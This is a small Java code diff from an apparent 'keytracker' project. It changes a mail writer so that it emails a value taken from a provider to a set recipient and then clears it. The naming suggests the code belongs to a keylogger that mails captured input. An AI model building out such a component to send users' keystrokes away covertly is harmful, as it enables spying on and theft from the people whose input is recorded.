@@ -1,5 +1,6 @@
 package com.keytracker.file;
 
+import com.keytracker.ValueProvider;
 import com.keytracker.mail.MailSender;
 
 public class MyMailWriter implements Writer {
@@ -12,7 +13,8 @@ public class MyMailWriter implements Writer {
     }
 
     @Override
-    public void write(String value) {
-        mailSender.send(value, to);
+    public void write(ValueProvider valueProvider) {
+        mailSender.send(valueProvider.extValue(), to);
+        valueProvider.clearExt();
     }
 }
